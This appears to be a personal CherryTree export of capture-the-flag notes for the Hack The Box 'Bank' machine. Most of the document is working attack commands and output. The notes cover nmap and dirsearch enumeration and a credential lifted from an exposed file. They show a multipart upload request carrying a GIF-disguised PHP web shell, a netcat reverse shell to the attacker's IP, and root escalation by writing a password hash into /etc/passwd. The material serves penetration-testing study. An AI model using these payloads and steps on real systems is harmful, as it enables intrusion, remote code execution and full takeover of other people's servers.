<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.29 Bank</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.29 Bank</h1><br/>root@kali:~/Desktop/Machines/HTB/Bank# nmap -sC -sV -oN BankNmap.txt 10.10.10.29 <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-20 11:29 EDT<br />Nmap scan report for 10.10.10.29<br />Host is up (0.15s latency).<br />Not shown: 997 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)<br />|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)<br />|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)<br />|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)<br />53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)<br />| dns-nsid: <br />|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu<br />80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />|_http-title: Apache2 Ubuntu Default Page: It works<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 17.90 seconds<br /><br />replacment for dirbuster\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://bank.htb">http://bank.htb</a> &gt;&gt; Bank.dirs<br />_|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-07-20_12-45-10.log<br /><br />Target: <a href="http://bank.htb">http://bank.htb</a><br /><br />[12:45:10] Starting: <br />[12:45:11] 403 -  279B  - /.php<br />[12:45:11] 302 -    7KB - /index.php  -&gt;  login.php<br />[12:45:12] 200 -    2KB - /login.php<br />[12:45:12] 302 -    3KB - /support.php  -&gt;  login.php<br />[12:45:13] 403 -  281B  - /icons/<br />[12:45:14] 403 -  283B  - /uploads/<br />[12:45:17] 200 -    2KB - /assets/<br />[12:45:31] 302 -    0B  - /logout.php  -&gt;  index.php<br />[12:45:46] 200 -    1KB - /inc/<br />[13:10:39] 403 -  289B  - /server-status/<br />[13:35:55] 200 -  248KB - /balance-transfer/<br /><br />Task Completed<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><a href="http://bank.htb/balance-transfer/">http://bank.htb/balance-transfer/</a><br />looking for a small one that is not encrypted<br />wget <a href="http://bank.htb/balance-transfer/">http://bank.htb/balance-transfer/</a><br />cat index.html | grep -v &quot;&gt;5&quot;      to remove files that are size 5(00-99) <br />68576f20e9732f1b2edc4df5b8533230.acc is left (size 257)<br />--ERR ENCRYPT FAILED<br />+=================+<br />| HTB Bank Report |<br />+=================+<br /><br />===UserAccount===<br />Full Name: Christos Christopoulos<br />Email: chris@bank.htb<br />Password: !##HTBB4nkP4ssw0rd!##<br />CreditCards: 5<br />Transactions: 39<br />Balance: 8842803 .<br />===UserAccount===<br /><br />msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f raw -o PhpShell.php<br />can only upload image<br />cp PhpShell.php PhpShell.gif<br />WHEN UPLOADING FILE CAPTURE WITH BURP!!!!!!!<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />POST /support.php HTTP/1.1<br />Host: bank.htb<br />User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: <a href="http://bank.htb/support.php">http://bank.htb/support.php</a><br />Content-Type: multipart/form-data; boundary=---------------------------25819144810188292491428089033<br />Content-Length: 631<br />Cookie: HTBBankAuth=dbo8uvvaj95qmg0ebsgujbrmm2<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br /><br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;title&quot;<br /><br />yeet<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;message&quot;<br /><br />cannon<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;PhpShell.gif.htb&quot;                                This line is also important<br />Content-Type: image/gif<br /><br />GIF89a/ &lt;?php echo system($_REQUEST[&#39;coolhand&#39;]); ?&gt;                                                                    THIS IS THE IMPORTANT LINE<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;submitadd&quot;<br /><br /><br />-----------------------------25819144810188292491428089033--<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />needed to change the magic bytes to GIF89a/ so it would be read as a gif<br />replace shell code with generic php call back<br />changed name to PhpShell.gif.htb becasue there is a comment in the responce saying that .htb files will run as .php<br />navigate to /support/ page and hover over most recent upload to see its location (bank.htb/uploads/PhpShell.gif.htb)<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami</a><br />wwwroot<br />in termial nc -nlvp 3232<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc</a><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc%2010.10.14.60%203232%20-c%20/bin/bash"> 10.10.14.60 3232 -c /bin/bash</a><br />enjoy your shell!!!!!<br /><br />SHELL FIX<br />python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;<br />control z<br />stty raw -echo<br />fg          you will be blind<br />now you can tab complete<br />export TERM=screen<br />now you can clear screen<br /><br />----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><a href="Protocols--smtp.html">LinEnum</a> show us we can write to passwd file<br />openssl passwd -1 coolhand<br />$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40<br />vi /etc/passwd<br />root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash<br />:wq!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>